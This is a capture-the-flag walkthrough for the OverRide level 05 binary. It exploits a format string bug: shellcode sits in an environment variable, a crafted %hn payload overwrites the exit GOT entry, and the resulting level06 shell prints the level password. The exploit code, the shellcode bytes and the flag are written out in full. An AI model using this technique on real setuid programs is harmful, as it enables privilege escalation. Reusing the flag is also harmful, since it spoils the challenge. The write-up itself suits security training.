# Walkthrough for Level 05

## Understanding the Binary

This binary is vulnerable to a format string vulnerability because it passes user input directly to `printf` as a
format string instead of as plain text. This type of attack potentially allows us to write to arbitrary memory locations.
We will use a format string attack to overwrite the address of the `exit` function in the Global Offset Table (GOT) with
the address of some shellcode that we will place in an environment variable. As a result, when the program calls `exit`,
it will actually execute our shellcode, spawning a shell.

## Shellcode

We use this [shellcode](https://shell-storm.org/shellcode/files/shellcode-827.html) for linux/x86 that spawns a shell.
Since the binary has SETUID enabled and its owner is the `level06` user, the resulting shell will run with `level06`
user privileges.

We export the shellcode in an environment variable called `PAYLOAD`. In this way, we have a fixed address where our
shellcode will be located in memory.

```shell
export PAYLOAD=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
```

## Getting the address of the payload

A little C program can be used to print the address of the `PAYLOAD` environment variable.

```shell
level05@OverRide:~$ cat <<eof > /tmp/payload_address_getter.c
> 
> #include <stdio.h>
> #include <stdlib.h>
> 
> int main(int argc, char *argv[]) {
>     printf("%p\n", getenv("PAYLOAD"));
> }
> eof
```

Compile and run the code to get the address of the `PAYLOAD` environment variable.

```shell
level05@OverRide:/tmp$ gcc -m32 payload_address_getter.c 
level05@OverRide:~$ /tmp/a.out
0xfffed8e0
```
Breaking down this address into two short integers, we get `0xfffe` for the high-order bytes and `0xd8e0` for the
low-order bytes. We will use these values later in our format string.

## Getting the address of the `exit` libc function in the GOT (Global Offset Table)

```shell
level05@OverRide:~$ objdump -R ./level05 | grep " exit"
080497e0 R_386_JUMP_SLOT   exit
```

We’ll write two short integers (2 bytes each). To do that, we’ll use the specifier: `%hn`.
We want to write `0xfffe` (65534 in decimal) in the high-order bytes and `0xd8e0` (55520 in decimal) in the low-order bytes.

We want to write these values to the address `0x080497e0`: `0xd8e0` (the lower two bytes) at `0x080497e0`, and `0xfffe`
(the higher two bytes) at `0x080497e2` (`0x080497e0 + 2`).

In little-endian, this address becomes `\xe0\x97\x04\x08` for the lower two bytes and `\xe2\x97\x04\x08` for the higher
two bytes. Or concatenated in `\xe0\x97\x04\x08\xe2\x97\x04\x08`.

## Determining the position of our argument on the Stack

To determine the position of our argument on the stack, we can run the binary with a format string that prints several
values from the stack.

```shell
level05@OverRide:~$ ./level05 
aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p 
aaaa.0x64.0xf7fcfac0.0xf7ec3af9.0xffffd6cf.0xffffd6ce.(nil).0xffffffff.0xffffd754.0xf7fdb000.0x61616161.0x2e70252e
```

We can see that the 10th argument on the stack is `0x61616161` (which corresponds to `aaaa` in hexadecimal), so we will
use 10 as our starting positional parameter: `%10$n`. Based on the previous step, we need two positional parameters:
`%10$hn` for the lower-order bytes and `%11$hn` for the higher-order bytes.

## Padding the format string

The `n` format specifier writes the number of characters printed so far to the specified memory location. Since we are
using `%hn`, it will write only the lower two bytes of that number.

`AAAA%96x%10$n` will write the value 100 at the address 0x41414141. The `%96x` specifier will pad the output with 96
characters, resulting in a total of 100 characters printed (four from AAAA and 96 from the padding).

## Crafting the Exploit

The resulting exploit is: `\xe0\x97\x04\x08\xe2\x97\x04\x08%55512x%10$hn%10014x%11$hn`

- `\xe0\x97\x04\x08` or `0x080497e0` (in reverse order) points to the low order bytes.
- `\xe2\x97\x04\x08` or `0x080497e2` (in reverse order) points to the high order bytes.
- `%55512x` will write 55512 bytes on the standard output.
- `%10$hn` will write 8 + 55512 = 55520 bytes (or 0xd8e0) to the first address specified (0x080497e0).
- `%10014x` will write 10014 bytes on the standard output.
- `%11$hn` will write 8 + 55512 + 10014 = 65534 (or 0xfffe) to the second address specified (0x080497e2).

We use Python to generate the exploit and save it to a file.

```shell
level05@OverRide:~$ python2 -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55512x%10$hn%10014x%11$hn"' > /tmp/exploit05
```

## Running the exploit against the binary and getting the password

We leave a STDIN open using `cat -` so that when the shell is spawned, it will be attached to our terminal and we will
be able to interact with it.

```shell
level05@OverRide:~$ (cat /tmp/exploit05 ; cat -) | ./level05
# ...SNIP...
whoami
level06
cd ../level06
cat .pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```